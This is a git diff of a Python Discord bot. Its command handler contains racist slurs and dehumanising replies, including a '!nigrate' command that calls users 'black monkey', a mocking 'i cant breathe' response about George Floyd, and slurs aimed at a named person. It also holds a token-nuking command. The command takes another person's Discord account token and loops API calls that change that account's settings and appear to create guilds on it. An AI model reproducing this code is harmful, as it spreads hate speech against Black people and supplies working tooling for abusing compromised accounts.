@@ -10,7 +10,7 @@ import base64
 from googletrans import Translator
 from itertools import cycle
 
-
+token = ""
 
 
 
@@ -98,16 +98,9 @@ async def on_message_delete(message):
 @bot.event
 async def on_message(message):
 
-
-         
-        if message.content == '!nigrate' and message.author.id != 761940434184044605 and message.author.id != 477211936380026883:
-          embed = discord.Embed(title='nigrate', color = color, description=f"ur nigrate is {random.randint(0,100)}% u black monkey ")
-          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/887809991971581962/898693499787046922/cat-kissing.gif")
-          await message.channel.send(embed=embed)
-          return
-
-        elif message.content == '!help':
-          embed = discord.Embed(title='List', color = color, description=f"""**!test** - checks to see if the bot is running
+        if message.content == '!help':
+          embed = discord.Embed(title='List', color = color, description=f"""
+**!test** - checks to see if the bot is running
 
 **!snipe** - sends the last deleted message 
 **!translate** - translates text to english 
@@ -121,7 +114,8 @@ async def on_message(message):
 **!ipinfo** - checks an ip 
 **!pingsite** - checks if a website is up 
 
-**!av** - sends ur avatar (only send's your avatar)
+**!banner** - steals anyones banner
+**!av** - steals anyones avatar
 **!meme** - sends a shitty reddit meme lol 
 **!racc** - sends a raccoon pic 
 **!cat** - sends a cat pic 
@@ -130,18 +124,13 @@ async def on_message(message):
 **!guessinggame** - guessing game (if someone interrupts it breaks)
 **!nigrate** - sends ur nigrate u blackie 
 
-`credits:`
-`xyte (creator),
-riskz (some of the commands),
-ghurb (ideas),
-cyhped (skid)`
 """)  
           embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/887809991971581962/898693499787046922/cat-kissing.gif")
           await message.channel.send(embed=embed)
 
         elif message.content == "4ren":
           await message.channel.send("u mean the retard monkey :clown: :clown: :clown:")
-        
+
         elif message.content == "floyd":
           await message.channel.send("i cant breathe")
           await message.channel.send("https://i.imgur.com/mn3EslL.png")
@@ -149,6 +138,8 @@ cyhped (skid)`
 
         elif message.content == "!test":
           await message.channel.send("bot is working!")
+
+
 
         elif message.content == '!deletewebhook':
           await message.channel.send('Webhook? ')
@@ -180,18 +171,13 @@ cyhped (skid)`
           embed = discord.Embed(title=f"Decoded: {base64_string}", color=color)
           await message.channel.send(embed=embed)
 
-        elif message.content == '!nigrate' and message.author.id == 761940434184044605:
-          embed = discord.Embed(title='nigrate', color = color, description=f"ur nigrate is 0% u white boy")
+        elif message.content == '!nigrate':
+          embed = discord.Embed(title='nigrate', color = color, description=f"ur nigrate is {random.randint(0,100)}% u black monkey ")
           embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/887809991971581962/898693499787046922/cat-kissing.gif")
           await message.channel.send(embed=embed)
           return
 
 
-        elif message.content == '!nigrate' and message.author.id == 477211936380026883:
-          embed = discord.Embed(title='nigrate', color = color, description=f"ur nigrate is 0% u white boy")
-          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/887809991971581962/898693499787046922/cat-kissing.gif")
-          await message.channel.send(embed=embed)
-          return
 
         elif message.content == "!dog":
              async with aiohttp.ClientSession() as session:
@@ -205,6 +191,9 @@ cyhped (skid)`
           await message.channel.send("Token?")
           response = await bot.wait_for('message')
           _token = str(response.content)
+          await message.channel.send("Server names?")
+          response2 = await bot.wait_for('message')
+          names = str(response2.content)
           headers = {
               'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
               'Content-Type': 'application/json',
@@ -224,12 +213,14 @@ cyhped (skid)`
               'convert_emoticons': False,
               'enable_tts_command': False,
               'explicit_content_filter': '0',
-              'status': "invisible"
+              'status': "invisible",
+              'developer_mode': True
+              
           }
           guild = {
               'channels': None,
               'icon': None,
-              'name': "GET TOKEN FUCKED SON LOLOLOLOLOLOL",
+              'name': names,
               'region': "europe"
           } 
           for _i in range(50):
@@ -243,13 +234,13 @@ cyhped (skid)`
                   break
           modes = cycle(["light", "dark"])
           statuses = cycle(["online", "idle", "dnd", "invisible"])
-          while True:
+          for i in range(100):
               setting = {
                   'theme': next(modes),
                   'locale': random.choice(locales),
                   'status': next(statuses)
               }
-              while True:
+              for i in range(100):
                   try:
                       request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
                   except Exception as e:
@@ -278,7 +269,7 @@ cyhped (skid)`
 
 
         elif message.content == "!meme":
-          embed = discord.Embed(title="", description="")
+          embed = discord.Embed(title="", description="", color=color)
 
           async with aiohttp.ClientSession() as cs:
               async with cs.get('https://www.reddit.com/r/dankmemes/new.json?sort=hot') as r:
@@ -385,6 +376,23 @@ cyhped (skid)`
 
         elif message.content == "!av":
           await message.channel.send('User?')
+          try:
+            response = await bot.wait_for('message')
+            response2 = response.content
+            user2 = response2.strip('<')
+            user3 = user2.strip('>')
+            user4 = user3.strip('@')
+            user5 = user4.strip('!')
+            user = await bot.fetch_user(user5)
+            await message.channel.send(user.avatar_url)
+          except:
+            response = await bot.wait_for('message')
+            response2 = response.content
+            user = await bot.fetch_user(response2)
+            await message.channel.send(user.avatar_url)
+
+        elif message.content == "!banner":
+          await message.channel.send('User?')
           response = await bot.wait_for('message')
           response2 = response.content
           user2 = response2.strip('<')
@@ -392,9 +400,13 @@ cyhped (skid)`
           user4 = user3.strip('@')
           user5 = user4.strip('!')
           user = await bot.fetch_user(user5)
-          await message.channel.send(user.avatar_url)
-
-
+          req = await bot.http.request(discord.http.Route("GET", "/users/{uid}", uid = user.id))
+          banner_id = req["banner"]
+          if banner_id == None:
+            await message.channel.send("No banner!")
+          else:
+            banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
+            await message.channel.send(banner_url)
 
 
 
@@ -448,5 +460,5 @@ cyhped (skid)`
 
 
 
-          
-bot.run("ur tokn")
+        
+bot.run(token)
